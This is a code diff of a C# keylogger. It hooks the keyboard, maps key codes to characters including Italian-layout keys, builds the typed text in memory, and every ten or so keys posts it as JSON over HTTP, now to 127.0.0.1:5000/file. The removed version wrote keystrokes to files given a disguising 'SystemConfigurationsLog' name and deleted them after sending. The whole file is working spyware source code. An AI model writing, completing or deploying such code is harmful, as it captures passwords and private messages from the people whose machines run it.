@@ -1,14 +1,7 @@
 ﻿using static System.Net.Mime.MediaTypeNames;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Collections.Generic;
-using System.Windows.Forms;
-using System.IO;
-using System.Net.Http;
 using System.Net;
-using System.Text;
-using Newtonsoft.Json;
-using System.Runtime.CompilerServices;
 
 
 namespace keylogger
@@ -40,8 +33,7 @@ namespace keylogger
         }
 
         private static int wordCounter = 0;
-        private static int fileCounter = 0;
-        private static string actualFile = "SystemConfigurationsLog_" + fileCounter.ToString() + ".txt";
+        private static string actualString = "";
         private static Dictionary<string, string> dizionario = new Dictionary<string, string>
         {
             {"D0", "0"},
@@ -57,8 +49,16 @@ namespace keylogger
             {"Enter", "\n"},
             {"Space", " "},
             {"Back", "[Back]" },
-
-
+            {"Oem4", "'" },
+            {"Oem6", "ì" },
+            {"OemSemicolon", "è" },
+            {"Oemplus", "+" },
+            {"Oem3", "ò" },
+            {"Oem7", "à" },
+            {"Oem2", "ù" },
+            {"Oemcomma", "," },
+            {"OemPeriod", "." },
+            {"OemMinus", "-" }
         };
 
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -71,10 +71,8 @@ namespace keylogger
                 if (wordCounter > 10)
                 {
                     saveLog();
-                    File.Delete(actualFile);
                     wordCounter = 0;
-                    fileCounter++;
-                    actualFile = "SystemConfigurationsLog_" + fileCounter.ToString() + ".txt";
+                    actualString = "";
                 }
                 InsertKey(vkCode);
             }
@@ -85,11 +83,11 @@ namespace keylogger
         {
             var jsonData = new
             {
-                title = actualFile,
-                text = File.ReadAllLines(actualFile)
+                title = "latest read",
+                text = actualString
             };
 
-            string url = "http://localhost:8000";
+            string url = "http://127.0.0.1:5000/file";
 
             using (WebClient client = new WebClient())
             {
@@ -110,9 +108,9 @@ namespace keylogger
         private static void InsertKey(int vkCode)
         {
             if (dizionario.ContainsKey($"{(Keys)vkCode}"))
-                File.AppendAllText(actualFile, dizionario[$"{(Keys)vkCode}"]);
+                actualString += dizionario[$"{(Keys)vkCode}"];
             else
-                File.AppendAllText(actualFile, $"{(Keys)vkCode}");
+                actualString += $"{(Keys)vkCode}";
 
             wordCounter++;
         }
